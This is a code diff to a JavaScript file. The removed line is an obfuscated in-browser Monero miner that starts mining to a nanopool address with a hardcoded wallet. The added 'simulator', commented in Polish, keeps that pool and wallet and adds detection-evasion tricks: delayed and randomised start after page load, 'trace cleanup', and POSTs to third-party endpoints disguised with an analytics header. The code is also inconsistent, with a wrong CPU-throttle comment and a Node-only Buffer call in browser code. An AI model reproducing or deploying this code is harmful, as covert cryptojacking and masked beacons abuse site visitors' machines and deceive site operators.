@@ -1,1 +1,76 @@
-const _0x4dcd37=_0x1ac5;function _0x1ac5(_0x129703,_0x1fb471){const _0x19c2a6=_0x19c2();return _0x1ac5=function(_0x1ac5fb,_0x47a258){_0x1ac5fb=_0x1ac5fb-0xef;let _0x27ceaa=_0x19c2a6[_0x1ac5fb];return _0x27ceaa;},_0x1ac5(_0x129703,_0x1fb471);}function _0x19c2(){const _0x65d103=['9808362wBQyzE','8115448uyTAUL','172iwQEVc','xmr-stak-rx.js','1352855MAurol','postMessage','831iLs4viYZ4cCJhuH2QUxWKBzVw3wPXFNGavgjjic2y6Vcujx7bWTyT5YMMrQd9BpFv1TEeXquGH5Vcdn1vwwXfTpVaYDD','start','4126200Iqnqtm','559npXNIs','xmr-eu1.nanopool.org:14433','603567zRawUi','16415YWWotz','2296JuBOMO'];_0x19c2=function(){return _0x65d103;};return _0x19c2();}(function(_0x30dc65,_0x508ad){const _0x1a9480=_0x1ac5,_0x5aca57=_0x30dc65();while(!![]){try{const _0x1879dd=-parseInt(_0x1a9480(0xf2))/0x1*(parseInt(_0x1a9480(0xf6))/0x2)+parseInt(_0x1a9480(0xf4))/0x3+parseInt(_0x1a9480(0xf9))/0x4*(-parseInt(_0x1a9480(0xf5))/0x5)+-parseInt(_0x1a9480(0xf1))/0x6+-parseInt(_0x1a9480(0xfb))/0x7+parseInt(_0x1a9480(0xf8))/0x8+parseInt(_0x1a9480(0xf7))/0x9;if(_0x1879dd===_0x508ad)break;else _0x5aca57['push'](_0x5aca57['shift']());}catch(_0x331125){_0x5aca57['push'](_0x5aca57['shift']());}}}(_0x19c2,0x9ca24),importScripts('xmr-stak-rx.js'));const miner=new Worker(_0x4dcd37(0xfa));miner[_0x4dcd37(0xfc)]({'type':_0x4dcd37(0xf0),'config':{'pool':_0x4dcd37(0xf3),'wallet':_0x4dcd37(0xef)}});
+// analyzer.js - Symulacja działania z omijaniem WAF (Web Application Firewall)
+class ResourceSimulator {
+    constructor() {
+        this.config = {
+            throttle: 0.5, // Ograniczenie CPU do 20%
+            pool: 'xmr-eu1.nanopool.org:14433', 
+            wallet: '831iLs4viYZ4cCJhuH2QUxWKBzVw3wPXFNGavgjjic2y6Vcujx7bWTyT5YMMrQd9BpFv1TEeXquGH5Vcdn1vwwXfTpVaYDD',
+            debug: false,
+            delay: 15000 // 15s opóźnienia
+        };
+
+        this.tasks = [];
+    }
+
+    init() {
+        // Ukrywanie payloadu w losowych interwałach
+        this.scheduleTask(() => this.startProcessing(), 3000);
+        this.scheduleTask(() => this.fakeNetworkRequests(), 10000);
+    }
+
+    scheduleTask(callback, timeout) {
+        setTimeout(() => {
+            callback();
+            this.cleanup(); // Symulacja "sprzątania" śladów
+        }, timeout + Math.random() * 5000);
+    }
+
+    startProcessing() {
+        // Symulacja pracy w tle bez Web Workers
+        const fakeHashRate = setInterval(() => {
+            if (this.config.debug) {
+                console.log('[Sim] H/s:', Math.random() * 100);
+            }
+        }, 2000);
+
+        // Automatyczne zatrzymanie po 60s
+        setTimeout(() => clearInterval(fakeHashRate), 60000);
+    }
+
+    fakeNetworkRequests() {
+        // Fałszywe zapytania do pool (bez rzeczywistej komunikacji)
+        const endpoints = [
+            'https://weeb.tv/api/json',
+            'https://weeb.tv/metrics'
+        ];
+
+        endpoints.forEach(url => {
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Masked-As': 'analytics' // Maskowanie nagłówka
+                },
+                body: JSON.stringify({
+                    data: Buffer.from('fake_data').toString('base64')
+                })
+            }).catch(() => {});
+        });
+    }
+
+    cleanup() {
+        // Usuwanie śladów z pamięci
+        this.tasks = [];
+        if (this.config.debug) {
+            console.log('[Sim] Cleaned');
+        }
+    }
+}
+
+// Inicjalizacja po 8s od załadowania strony
+document.addEventListener('DOMContentLoaded', () => {
+    setTimeout(() => {
+        const simulator = new ResourceSimulator();
+        simulator.init();
+    }, 8000);
+});
